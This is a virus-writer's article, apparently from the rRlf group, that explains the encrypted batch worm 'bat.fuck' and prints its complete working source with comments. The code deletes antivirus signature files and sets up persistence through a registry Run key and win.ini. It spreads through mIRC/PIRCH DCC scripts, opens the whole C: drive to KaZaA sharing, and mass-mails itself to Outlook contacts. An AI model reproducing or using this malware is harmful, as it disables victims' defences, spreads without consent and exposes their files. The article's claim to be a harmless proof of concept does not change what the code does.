bat.fuck by philet0ast3r [rRlf] : explained
--------------------------------------------

(Comment: bat.fuck gold edition, old and unreleased.
Written for something that has been forgotten.)

Everything used in this article is for demonstrative purposes only,
the author has no responsibility for any damage anyone else could cause with this code.

This article will try to explain the techniques used in bat.fuck,
the first encrypted batch virus, in detail.
This virus has not been written to be spread in the wild, but as proof of concept.
Actually it is not the first encrypted batch virus, but the first one,
that was also labeled by anti-virus researchers as encrypted.

Normally you would say, encrypting batch is not possible, because it's a
line by line interpreted script-language. You just have to think different...
Meanwhile another virus writer has developed a different encryption technique.
It's easier to use, but not that strong.

The virus we are talking about was detected by Trend Micro AV on 27.6.2002.
It has been submitted to the av company by the author, before it has been
uploaded to any virus sites.
The author wanted it to be known to av, before anyone can download it,
and spread it around, causing damage.
... Actually it's not a virus, because it does not infect any executable files.
It is a worm, that means, it sends away itself (with various techniques that will
be explained later) via networks and is not bound to any other file.
A virus would need a specific (infected) file to be shared for spreading.

We will go now through the code. Everything important will be explained.
Coments start with "::" and refer always to the code above.
As batch is a script language, it does not have to be compiled, but can be
executed as it is. "::" will not affect the code, so the virus can be
executed nevertheless (saving the code to a txt file and renaming it to bat).

=====[begin code]===============================================================
«ËæáËæáÑæáËÑ··Ú·ØÙÅæáËÑ··ÆÒÞ·ØÙÅæáËÑ···ÅæáËÑ·ÒÞ·ÅæáËÑ···ÅæáËÑ··ÅæáËÑ···ÅæáÑæáÅËËËÕÑ·ÅæáË¦©ËÉËËËËËËËËËËËËËËËËËËËËËËËËËËËËËËÅÉËÍË¨ÃÚØÂËÍË¨ÃÚÛÂËÍËÉËËËËËËËËËËÅÅÅËËËËËËÅÅÅÉËÍË¨ÃÚØÂËÍË¨ÃÚÛÂËÍËÉÃÇËËËËËËËËÐÂÉÇßÛÒÝÇÉÅËËÛØË°¹¶ÉÕÕÑ·ÅæáË¹®¬®¯¢¿ßÕÅæáË°£ ®²´§¤¨ª§´¦ª¨£¢¥®·¸¤­¿¼ª¹®·¦·¼·¨½·¹¶ÕÕÅæáËÉÉÖÉÑ··ÅÉÕÕÅæáËÄËÅæáÑæáË°¶ÕæáËÖÑ·ÅÅÕÕæáËÖÕÕæáË¥»Ö¥ÕÕæáÅÕÕæáËËÀËÎÎ·ÅËÎÎ··ÅæáËÎÎ·ÅæáËÎÎ··ÅËÎÎ·ÅæáËæáÑæáËÑ··ÅæáËÑ·ØÙ·ÅæáËÑ·Ú··ÅæáËÑ·Ú·ØÙ·ÅæáË°¶ÕæáËÛÖËÚÑ¡¤¢¥ÑÈÑÕÕæáËÚÖËÄËÃËËÖÖËÏËÂËËËÕÕæáËÙÖËÄÅËËÏËÑ·ÅÅÕÕæáËØÖÕÕæáËËÑ··ÅæáËËÑ·ØÙ·ÅæáËËÑ·Ú··ÅæáËËÑ·Ú·ØÙ·ÅæáËæáÑæáËÑ·ÒÓ·ÅæáË°§¶ÕæáË®ÖÚÕÕæáË¨ÖÝÕÕæáË§ÚÖÛÛÛÆ¾ÕÕæáËÛÛÛÆ¾®ÖÚÕÕæáË§ÙÖÚÛÛÆ§ËÚÛÛÕÕæáËÚÛÛÆ§ËÚÛÛ®ÖÚÕÕæáË§ØÖÙÛÛÆ§ËÙÛÛÕÕæáËÙÛÛÆ§ËÙÛÛ®ÖÚÕÕæáË§ßÖØÛÛÆ§ËØÛÛÕÕæáËØÛÛÆ§ËØÛÛ®ÖÚÕÕæáË§ÞÖßÛÛÆ§ËßÛÛÕÕæáËßÛÛÆ§ËßÛÛ®ÖÚÕÕæáË§ÝÖÞÛÛÆ§ËÞÛÛÕÕæáËÞÛÛÆ§ËÞÛÛ®ÖÚÕÕæáÅÕÕæáË°ÛÛÛÆ¾¶ÕÕæáË¾ÚÖÁÊÁ«ÁÕÕæáË¾¨ÖÚÕÕæáË®ÚÖ¤¥Ë¡¤¢¥ÑÈÑÄËËÏËÑ·ÅÅÕÕæáË®¨ÖÚÕÕæáÅÕÕæáË°ÚÛÛÆ§ËÚÛÛ¶ÕÕæáË¾¨ÖÛÕÕæáË®¨ÖÛÕÕæáÅÕÕæáË°ÙÛÛÆ§ËÙÛÛ¶ÕÕæáË¾¨ÖÛÕÕæáË®¨ÖÛÕÕæáÅÕÕæáË°ØÛÛÆ§ËØÛÛ¶ÕÕæáË¾¨ÖÛÕÕæáË®¨ÖÛÕÕæáÅÕÕæáË°ßÛÛÆ§ËßÛÛ¶ÕÕæáË¾¨ÖÛÕÕæáË®¨ÖÛÕÕæáÅÕÕæáË°ÞÛÛÆ§ËÞÛÛ¶ÕÕæáË¾¨ÖÛÕÕæáË®¨ÖÛÕÕæáËËÑ·ÒÓ·ÅæáËæáÑæáË¹®¬®¯¢¿ßÕÅæáË°£ ®²´¨¾¹¹®¥¿´¾¸®¹·¸· ·§¨¶ÕÕÅæáËÉ¯¸ÉÖÑÛÛÛÛÛÛÛÛÕÕÅæáËÉ¯¯ÉÖÉ¨Ñ··»Ë­·· ±ª··¦Ë¸Ë­ÉÕÕÅæáËÉ¯ÛÉÖÉÛÚÙØßÞÑÑ··ÉÕÕÅæáËÄËÅæáÑæáÅËËËÕæáËËÇÇÇÇÕÕæáËËËÖË¼Å¨¤ÃÉ¼Å¸ÉÂÕÕæáËËËÖË¨¤ÃÉ¤ÅªÉÂÕÕæáËËËÖËÅ¬¥¸ÃÉ¦ª»¢ÉÂÕÕæáËËËÖËÚË¿ËÅª§Å¨ÕÕæáËËËÖËÅª§ÃÂÕÕæáËËÖËÚÕÕæáËËËÖËÅ¨¢ÃÛÂÕÕæáËËËÖËÚË¿ËÅª®Å¨ÕÕæáËËÖËÅª®ÃÂÕÕæáËÅ¹ÅªËÕÕæáËËÖËËÀËÚÕÕæáËÕÕæáËÅ¸ËÖËÉ®ËËËËÆÔË¥ÛÔËËÌËÊÉÕÕæáËÅ©ËÖËÉ¼ÇËËÌËËËËËËÃËËÌËËËÐÂËÅÅÅËÇËËËËËÊË²ËËËËËËËËËËÑËÌ£ËÇËË¢ËËËËÆÊÌËÅÅÅË¢ÌËËËÔÊËÉÕÕæáËÅªÅªËÃÉÑ·ÅÅÉÂÕÕæáËÅ¯ª¸ËÖË­ÕÕæáËÅ¸ÕÕæáËËÖËÉÉÕÕæáËÕÕæáËËÎÎ·ÅæáËÎÎ·ÅæáÑæáËÅæáËÅæáËÎÎ·Åæáæá

:: What looks like garbage here is the actual virus. In it's encrypted version.
:: We will later look at the decrypted virus and go through it's code.
:: As this above are no valid batch commands, nothing happens, Dos just displays
:: an error message (Command or file not found).

@echo off

:: echo off is the usual start of a batch file.
:: Result: Just important events/messages get displayed on the screen.
:: Without the echo off, everything that the batch file does would be displayed.
:: The @ in front of any command (echo off here) has the same effect as echo off,
:: but only for the line, it stands before.

cls

:: This command clears the screen
:: (of the error-messages that occured because of the encrypted code).

ctty nul

:: ctty leads the output to a given device. In this case the output is lead to nul
:: (the nul-device), meaning: There will be no output.

copy %0 c:\bat.fuck.bat

:: %0 is the running batch file. So the running batch file gets copied to c:\bat.fuck.bat
:: c:\bat.fuck.bat will be used for several viral actions.

if exist %winbootdir%\crypt.vbs goto tralala

:: %winbootdir% is the standard Windows directory (it doesn't have to be c:\windows)
:: So if %winbootdir%\crypt.vbs (this file is used for decryption/encryption) already exists,
:: the batch file jumps to label tralala (labels have a ":" in front of them).
:: if it does not exist, the batch file just goes on (creating %winbootdir%\crypt.vbs).
:: This command line just saves some time, if the file already exists.

echo e 0100 6F 6E 20 65 72 72 6F 72 20 72 65 73 75 6D 65 20>crypt
echo e 0110 6E 65 78 74 0D 0A 73 65 74 20 66 73 6F 20 3D 20>>crypt
echo e 0120 63 72 65 61 74 65 6F 62 6A 65 63 74 28 22 73 63>>crypt
echo e 0130 72 69 70 74 69 6E 67 2E 66 69 6C 65 73 79 73 74>>crypt
echo e 0140 65 6D 6F 62 6A 65 63 74 22 29 0D 0A 73 65 74 20>>crypt
echo e 0150 70 72 6F 63 34 20 3D 20 66 73 6F 2E 6F 70 65 6E>>crypt
echo e 0160 74 65 78 74 66 69 6C 65 28 22 63 3A 5C 62 61 74>>crypt
echo e 0170 2E 66 75 63 6B 2E 62 61 74 22 2C 20 31 29 0D 0A>>crypt
echo e 0180 6D 73 67 20 3D 20 70 72 6F 63 34 2E 72 65 61 64>>crypt
echo e 0190 61 6C 6C 0D 0A 64 64 64 20 3D 20 78 28 6D 73 67>>crypt
echo e 01A0 29 0D 0A 73 65 74 20 70 72 6F 63 32 20 3D 20 66>>crypt
echo e 01B0 73 6F 2E 63 72 65 61 74 65 74 65 78 74 66 69 6C>>crypt
echo e 01C0 65 28 22 63 3A 5C 62 61 74 2E 66 75 63 6B 2E 62>>crypt
echo e 01D0 61 74 22 2C 20 74 72 75 65 29 0D 0A 70 72 6F 63>>crypt
echo e 01E0 32 2E 77 72 69 74 65 6C 69 6E 65 20 64 64 64 0D>>crypt
echo e 01F0 0A 70 72 6F 63 32 2E 63 6C 6F 73 65 0D 0A 46 75>>crypt
echo e 0200 6E 63 74 69 6F 6E 20 78 28 73 54 65 78 74 29 0D>>crypt
echo e 0210 0A 4F 6E 20 45 72 72 6F 72 20 52 65 73 75 6D 65>>crypt
echo e 0220 20 4E 65 78 74 0D 0A 44 69 6D 20 65 6B 65 79 2C>>crypt
echo e 0230 20 69 2C 20 68 61 73 68 2C 20 63 72 62 79 74 65>>crypt
echo e 0240 0D 0A 65 6B 65 79 20 3D 20 32 33 35 0D 0A 46 6F>>crypt
echo e 0250 72 20 69 20 3D 20 31 20 54 6F 20 4C 65 6E 28 73>>crypt
echo e 0260 54 65 78 74 29 0D 0A 68 61 73 68 20 3D 20 41 73>>crypt
echo e 0270 63 28 4D 69 64 28 73 54 65 78 74 2C 20 69 2C 20>>crypt
echo e 0280 31 29 29 0D 0A 63 72 62 79 74 65 20 3D 20 43 68>>crypt
echo e 0290 72 28 68 61 73 68 20 58 6F 72 20 28 65 6B 65 79>>crypt
echo e 02A0 20 4D 6F 64 20 32 35 35 29 29 0D 0A 78 20 3D 20>>crypt
echo e 02B0 78 20 26 20 63 72 62 79 74 65 0D 0A 4E 65 78 74>>crypt
echo e 02C0 0D 0A 45 6E 64 20 46 75 6E 63 74 69 6F 6E 0D 0A>>crypt
echo e 02D0 C6>>crypt

:: This is a debug script. With the help of debug scripts, various files
:: (like bmp, wav, for example) can be included in a batch file.
:: Debug scripts can be created with "debug", a Dos command.
:: ("debug file -d" puts out numbers and letters, like the ones above,
:: but contain some " "s and "-"s, that have to be deleted).
:: The command "echo" normally echos something to the screen, but it can also
:: echo the same something to a file, putting a ">" behind what should be echoed.
:: To not overwrite something that has already been written, you can use ">>",
:: which writes to the next line.
:: In the code above, "e ..." gets written to the file "crypt" (current directory).
:: The "e" is neccessary for debug, which will later transform this gibberish back
:: to the original file.

echo rcx>>crypt
echo 01D0>>crypt

:: Some more debug commands have to be added, like rcx, which tells debug
:: the original file size. The number below is the original file size + 0100.
:: You can get the original file size by "debug file -rcx".

echo n crypt.vbs>>crypt

:: n tells debug, the name, the file should have, in this case: crypt.vbs

echo w>>crypt

:: w tells debug to write the file to disk.

echo q>>crypt

:: q quits the debug console.
:: Everything that is needed for letting debug doing the job all alone
:: has been written to "crypt".

debug<crypt

:: "<" tells debug, to execute every command, that's in "filename" (in this case "crypt").
:: This now produces "crypt.vbs".

del crypt

:: The file "crypt" (containing the debug commands) is no longer needed and thus deleted.

move crypt.vbs %winbootdir%

:: "crypt.vbs" gets moved to where it should be: The windows directory.

:tralala

:: This is the label, To which the program jumps, if the debuging is not neccessary
:: (see above).

start %winbootdir%\crypt.vbs

:: This starts %winbootdir%\crypt.vbs in an external process.
:: start is similar to the "call" command, which also starts other programs,
:: but waits, till they are finished.
:: "%winbootdir%\crypt.vbs" will now encrypt/decrypt "c:\bat.fuck.bat"
:: The result will be: The encrypted code at the beginning will now be decrypted,
:: while the rest (the code that has been executed till now) will be encrypted,
:: making it useless, because Dos can no longer execute it.
:: But that doesn't mater, because it is no longer important for the virus execution.

start c:\bat.fuck.bat

:: Now the actual virus gets started.

:end
exit

:: "exit" exits Dos mode (the program).

=====[end code]=================================================================

This was the code of the whole virus.
Now we will examine the files, that get dropped by the virus.
The following is the code of %winbootdir%\crypt.vbs, the program, that
encrypts/decrypts the virus.
The original program is by an other virus author, who allowed me to use
his code. It has just been edited a bit, to better fit the needs of this virus.
What it does:
Open the file "c:\bat.fuck.bat" and rewrite the content to the same file,
after doing several mathematical operations with it.

=====[begin code]===============================================================
on error resume next
set fso = createobject("scripting.filesystemobject")
set proc4 = fso.opentextfile("c:\bat.fuck.bat", 1)
msg = proc4.readall
ddd = x(msg)
set proc2 = fso.createtextfile("c:\bat.fuck.bat", true)
proc2.writeline ddd
proc2.close
Function x(sText)
On Error Resume Next
Dim ekey, i, hash, crbyte
ekey = 235
For i = 1 To Len(sText)
hash = Asc(Mid(sText, i, 1))
crbyte = Chr(hash Xor (ekey Mod 255))
x = x & crbyte
Next
End Function

=====[end code]=================================================================

The following is the code of the actual virus. "c:\bat.fuck.bat" looks like that,
after the execution of the decryption/encryption vbs.
Again with comments.

=====[begin code]===============================================================
@echo off
ctty nul
:retro
del c:\programme\norton~1\s32integ.dll
del c:\programme\f-prot95\fpwm32.dll
del c:\programme\mcafee\scan.dat
del c:\tbavw95\tbscan.sig
del c:\programme\tbav\tbav.dat
del c:\tbav\tbav.dat
del c:\programme\avpersonal\antivir.vdf

:: Files of several anti virus products get deleted (the programs are:
:: Norton AntiVirus 2000, AntiVir /9X Personal Edition, F-Prot 95, McAfee,
:: Thunderbyte). The avs are unable to scan properly without those files.
:: This has been found out by experimenting with the programs.
:: ... Deleting files, and look what happens.

:payload
echo.on error resume next>c:\payload.vbs
echo MsgBox "                              bat.fuck" & Chr(13) & Chr(10) & "          ...be sure to get all the meanings..." & Chr(13) & Chr(10) & "(ah, this is a presentation of encrypted batch ;)",4096,"bat.fuck by philet0ast3r [rRlf]">>c:\payload.vbs

:: This creates "c:\payload.vbs".
:: Executing this vbs just shows up a message box, telling:
:: "bat.fuck
:: ...be sure to get all the meanings...
:: (ah, this is a presentation of encrypted batch ;)"
:: It has the title: "bat.fuck by philet0ast3r [rRlf]"

echo REGEDIT4>payload.reg

:: Now a registry file ("payload.reg") gets written, to start the message box above
:: at every system start.
:: "REGEDIT4" is needed, for Windows recognizing this as a registry file.

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]>>payload.reg

:: [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run] is a registry key,
:: where links to programs are stored, that are started at every system start.
:: [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices]
:: would be another such key.

echo "msg"="c:\\payload.vbs">>payload.reg

:: This gets written under the registry key mentioned above.
:: A link to "c:\payload.vbs", the program, that displays the message box.
:: In registry entries, all "\"s have to be written double,
:: like "c:\\" instead of "c:\".

regedit /s payload.reg

:: regedit is a Windows program for editing the registry.
:: This command adds the information stored in "payload.reg" to the registry.
:: Normally a message box would pop up, telling
:: "The Information stored in "file" has been added to the registry."
:: This will not happen because of "/s", which is an undocumented option.
:: s stands for silent, meaning, the message box won't pop up.

:residency
echo [windows]>residency
echo load=c:\bat.fuck.bat>>residency
echo run=>>residency
echo NullPort=None>>residency
echo.>>residency

:: Some Information, that will start the virus from c:\bat.fuck.bat at every system start
:: with the help of the win.ini (windows directory) gets written to the file "residency"
:: (current directory). "load=" determines what gets loaded on windows start-up.
:: "echo.>>" produces a blank line.

copy residency + %winbootdir%\win.ini %winbootdir%\system\win.ini
del %winbootdir%\win.ini
move %winbootdir%\system\win.ini %winbootdir%\win.ini
del residency

:: This few commands replace the original win.ini with an "infected" win.ini
:: (the file "residency" has been copied in front of the old win.ini).
:: "residency" gets deleted, because it is no longer neccessary for the virus.

:mirc
del c:\mirc\script.ini
del c:\mirc32\script.ini
del c:\progra~1\mirc\script.ini
del c:\progra~1\mirc32\script.ini

:: This deletes mIRC scripts in posible standard mIRC directories,
:: that the virus can put it's own script at this place.

echo [script]>mirc
echo n0=on 1:JOIN:#:{>>mirc
echo n1= /if ( nick == $me ) { halt }>>mirc
echo n2= /.dcc send $nick c:\bat.fuck.bat>>mirc
echo n3=}>>mirc

:: Here the worm-mIRC-script gets written to the file "mirc" (current directory).
:: It dcc-sends the virus to every user, who joins a channel, where an infected user is in.

move mirc c:\mirc\script.ini
move mirc c:\mirc32\script.ini
move mirc c:\progra~1\mirc\script.ini
move mirc c:\progra~1\mirc32\script.ini
del mirc

:: This moves the virus-script to the place, where a normal mIRC script would be.
:: It also gets deleted afterwards (in case it hadn't been moved), to leave no traces.

:pirch
del c:\pirch98\events.ini
echo [Levels]>pirch
echo Enabled=1>>pirch
echo Count=6>>pirch
echo Level1=000-Unknowns>>pirch
echo 000-UnknownsEnabled=1>>pirch
echo Level2=100-Level 100>>pirch
echo 100-Level 100Enabled=1>>pirch
echo Level3=200-Level 200>>pirch
echo 200-Level 200Enabled=1>>pirch
echo Level4=300-Level 300>>pirch
echo 300-Level 300Enabled=1>>pirch
echo Level5=400-Level 400>>pirch
echo 400-Level 400Enabled=1>>pirch
echo Level6=500-Level 500>>pirch
echo 500-Level 500Enabled=1>>pirch
echo.>>pirch
echo [000-Unknowns]>>pirch
echo User1=*!*@*>>pirch
echo UserCount=1>>pirch
echo Event1=ON JOIN:#:/dcc send $nick c:\bat.fuck.bat>>pirch
echo EventCount=1>>pirch
echo.>>pirch
echo [100-Level 100]>>pirch
echo UserCount=0>>pirch
echo EventCount=0>>pirch
echo.>>pirch
echo [200-Level 200]>>pirch
echo UserCount=0>>pirch
echo EventCount=0>>pirch
echo.>>pirch
echo [300-Level 300]>>pirch
echo UserCount=0>>pirch
echo EventCount=0>>pirch
echo.>>pirch
echo [400-Level 400]>>pirch
echo UserCount=0>>pirch
echo EventCount=0>>pirch
echo.>>pirch
echo [500-Level 500]>>pirch
echo UserCount=0>>pirch
echo EventCount=0>>pirch
move pirch c:\pirch98\events.ini
del pirch

:: Now the same for pIRCh, the script is just a bit longer/different,
:: but it does the same, as the mIRC script.

:kazaa
echo REGEDIT4>kazaa.reg
echo [HKEY_CURRENT_USER\Software\Kazaa\LocalContent]>>kazaa.reg
echo "DisableSharing"=dword:00000000>>kazaa.reg
echo "DownloadDir"="C:\\Program Files\\KaZaA\\My Shared Folder">>kazaa.reg
echo "Dir0"="012345:c:\\">>kazaa.reg
regedit /s kazaa.reg

:: Now a registry key gets written, that enables the virus to spread via the
:: well-used p2p filesharing program KaZaA. It replaces the original key, with
:: an a bit "improved" version: The last line of the key ("Dir0"="012345:c:\\"),
:: enables file sharing also from the directory c:\ (where the virus is in),
:: not only from the standard KaZaA sharing directory (C:\Program Files\KaZaA\My Shared Folder).
:: this works on all previously released versions of KaZaA and KaZaA Lite.

:outlook
echo.on error resume next>outlook
echo dim a,b,c,d,e>>outlook
echo set a = Wscript.CreateObject("Wscript.Shell")>>outlook
echo set b = CreateObject("Outlook.Application")>>outlook
echo set c = b.GetNameSpace("MAPI")>>outlook
echo for y = 1 To c.AddressLists.Count>>outlook
echo set d = c.AddressLists(y)>>outlook
echo x = 1>>outlook
echo set e = b.CreateItem(0)>>outlook
echo for o = 1 To d.AddressEntries.Count>>outlook
echo f = d.AddressEntries(x)>>outlook
echo e.Recipients.Add f>>outlook
echo x = x + 1>>outlook
echo next>>outlook
echo e.Subject = "Ever saw an encrypted batch-worm? N0? then it's time!">>outlook
echo e.Body = "Well, you don't have to execute the attachment (if you don't want to ;) ... hey, at least look at it! You can boast at your friends this evening at the strip: 'Hey comrades, today I saw an encrypted batch-worm!' ... Isn't that fascinating ?! ">>outlook
echo e.Attachments.Add ("c:\bat.fuck.bat")>>outlook
echo e.DeleteAfterSubmit = False>>outlook
echo e.Send>>outlook
echo f = "">>outlook
echo next>>outlook

:: Now a vbs file gets written (to file "outlook" in the current directory),
:: that sends the virus away as mail attachment with the help of outlook.
:: Those kinds of vbs worms are widly used by viruses (and not very effective anymore,
:: because most anti virus products have heuristic engines for this kind of malware).
:: The vbs does the following: Pick addresses from the address-book, create a new mail,
:: with the subject "Ever saw an encrypted batch-worm? N0? then it's time!", the body
:: "Well, you don't have to execute the attachment (if you don't want to ;) ...
:: hey, at least look at it! You can boast at your friends this evening at the strip:
:: 'Hey comrades, today I saw an encrypted batch-worm!' ... Isn't that fascinating ?!",
:: and the virus (c:\bat.fuck.bat) attached. After the mail has been submitted,
:: it gets deleted to leave no traces.
:: ... If someone doesn't belive, this virus has just been written to show programming
:: techniques, and not to be spread in the wild, he can see it here:
:: What inocent user would execute an attachment, when in the mail is said,
:: that it's a virus ?!

move outlook %winbootdir%\outlook.vbs
start %winbootdir%\outlook.vbs

:: Now the file "outlook" gets moved to the windows directory (with the extension vbs),
:: and executed from there.

:end
del payload.reg
del kazaa.reg

:: The virus clears some unneccessary traces.

start %winbootdir%\crypt.vbs

:: After everything has been done, the decryption/encryption vbs gets executed again,
:: returning the virus to its original form (the virus part encrypted).

exit

:: The virus exits Dos mode, because what would follow would be the now encrypted
:: decryption/encryption stuff, what would be junk, and just causing error messages.

æá

:: This ("æá") is something left over from the decryption/encryption process,
:: but it does not matter, because the virus exits before.
:: It just grows some very little bit everytime it gets executed.
:: You could call this very weak polymorphism :) ... Lifeform ...
=====[end code]=================================================================

All here explained virus writing techniques have been learned with the help of (basic)
programming skills, virus scene tutorials, source codes of other viruses and (a lot)
just through experimenting. Some book that explains/teaches programming has
never really been read by the author...

I hope this article helped a bit understanding, what a virus is, what it does and how it
could be written. Although most (effective) viruses today are written in win32asm,
this one shows some spreading techniques often used by worms.

If you want to contact the author of this article, do so:
philet0ast3r@rRlf.de
www.rRlf.de